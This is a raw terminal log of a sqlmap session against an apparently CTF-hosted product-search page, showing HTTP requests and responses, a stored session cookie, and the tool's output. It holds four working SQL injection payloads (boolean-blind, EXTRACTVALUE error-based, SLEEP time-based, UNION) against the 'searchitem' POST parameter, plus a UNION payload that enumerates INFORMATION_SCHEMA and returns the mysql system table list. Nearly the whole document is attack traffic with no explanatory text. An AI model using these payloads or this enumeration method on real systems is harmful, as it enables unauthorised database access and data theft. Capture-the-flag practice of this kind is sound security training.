+[[36m14:48:54[0m] [[34mDEBUG[0m] declared web page charset '[37mutf-8[0m'
+[[36m14:48:54[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#1[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:19:13 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 787
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome rhombus!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+</table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=rhombus">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: searchitem=-6911' OR 8362=8362-- IKRA
+    Vector: OR [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchitem=asdf' AND EXTRACTVALUE(2004,CONCAT(0x5c,0x7162707a71,(SELECT (ELT(2004=2004,1))),0x7170767871))-- rqEV
+    Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=asdf' AND (SELECT 4145 FROM (SELECT(SLEEP(5)))xewr)-- qhSg
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: searchitem=asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,0x59787948506a76647247676d5575755370735a415564474c62566d68506642494e616a565077556e,0x7170767871),NULL,NULL-- EpeQ
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+[[36m14:48:54[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38, PHP 7.3.17
+back-end DBMS: MySQL >= 5.1
+[[36m14:48:54[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/prashanth/.sqlmap/output/sqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:48:54[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 273 days!!![0m
+
+[*] ending @ 14:48:54 /2020-05-02/
+
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0msqlmap -r search -p searchitem -D mysql -v 6 --fresh-queries [C[1@-[C[1@-[1@t[1@a[1@b[1@l[1@e[1@s[1@ 
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;90m1.3.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m)[01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:49:33 /2020-05-02/
+
+[[36m14:49:33[0m] [[32mINFO[0m] parsing HTTP request from '[37msearch[0m'
+[[36m14:49:33[0m] [[34mDEBUG[0m] not a valid WebScarab log data
+[[36m14:49:33[0m] [[34mDEBUG[0m] cleaning up configuration parameters
+[[36m14:49:33[0m] [[34mDEBUG[0m] setting the HTTP timeout
+[[36m14:49:33[0m] [[34mDEBUG[0m] setting the HTTP User-Agent header
+[[36m14:49:33[0m] [[34mDEBUG[0m] creating HTTP requests opener object
+[[36m14:49:33[0m] [[34mDEBUG[0m] provided parameter '[37msearchitem[0m' is not inside the Cookie
+[[36m14:49:33[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m14:49:33[0m] [[34mDEBUG[0m] resolving hostname '[37msqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:49:34[0m] [[32mINFO[0m] testing connection to the target URL
+[[36m14:49:34[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#1[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 15
+Connection: close
+
+searchitem=asdf
+
+[[36m14:49:34[0m] [[34mDEBUG[0m] declared web page charset '[37mutf-8[0m'
+[[36m14:49:34[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#1[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:19:53 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 789
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome admin!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+</table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=admin">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: searchitem=-6911' OR 8362=8362-- IKRA
+    Vector: OR [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchitem=asdf' AND EXTRACTVALUE(2004,CONCAT(0x5c,0x7162707a71,(SELECT (ELT(2004=2004,1))),0x7170767871))-- rqEV
+    Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=asdf' AND (SELECT 4145 FROM (SELECT(SLEEP(5)))xewr)-- qhSg
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: searchitem=asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,0x59787948506a76647247676d5575755370735a415564474c62566d68506642494e616a565077556e,0x7170767871),NULL,NULL-- EpeQ
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+[[36m14:49:34[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38, PHP 7.3.17
+back-end DBMS: MySQL >= 5.1
+[[36m14:49:34[0m] [[32mINFO[0m] fetching tables for database: '[37mmysql[0m'
+[[36m14:49:34[0m] [[36mPAYLOAD[0m] asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(table_name AS CHAR),0x20),0x7170767871),NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6d7973716c)-- BOPp
+[[36m14:49:34[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#2[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 258
+Connection: close
+
+searchitem=asdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7162707a71%2CIFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%2C0x7170767871%29%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x6d7973716c%29--%20BOPp
+
+[[36m14:49:35[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#2[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:19:53 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 1106
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome rhombus!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+<tr><td style="width:200px"></td><td style="width:200px">qbpzqcolumns_privqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqcomponentqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqdbqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqdefault_rolesqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqengine_costqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqfuncqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqgeneral_logqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqglobal_grantsqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqgtid_executedqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqhelp_categoryqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqhelp_keywordqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqhelp_relationqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqhelp_topicqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqinnodb_index_statsqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqinnodb_table_statsqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqpassword_historyqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqpluginqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqprocs_privqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqproxies_privqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqrole_edgesqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqserver_costqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqserversqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqslave_master_infoqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqslave_relay_log_infoqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqslave_worker_infoqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqslow_logqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtables_privqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtime_zoneqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtime_zone_leap_secondqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtime_zone_nameqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtime_zone_transitionqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqtime_zone_transition_typeqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzquserqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr></table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=rhombus">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+[[36m14:49:35[0m] [[34mDEBUG[0m] performed 1 queries in 0.38 seconds
+Database: mysql
+[33 tables]
++---------------------------+
+| user                      |
+| columns_priv              |
+| component                 |
+| db                        |
+| default_roles             |
+| engine_cost               |
+| func                      |
+| general_log               |
+| global_grants             |
+| gtid_executed             |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| password_history          |
+| plugin                    |
+| procs_priv                |
+| proxies_priv              |
+| role_edges                |
+| server_cost               |
+| servers                   |
+| slave_master_info         |
+| slave_relay_log_info      |
+| slave_worker_info         |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+
+[[36m14:49:35[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/prashanth/.sqlmap/output/sqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:49:35[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 273 days!!![0m
+
+[*] ending @ 14:49:35 /2020-05-02/
+
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+exit
+
+Script done on 2020-05-02 14:50:20+05:30 [COMMAND_EXIT_CODE="0"]
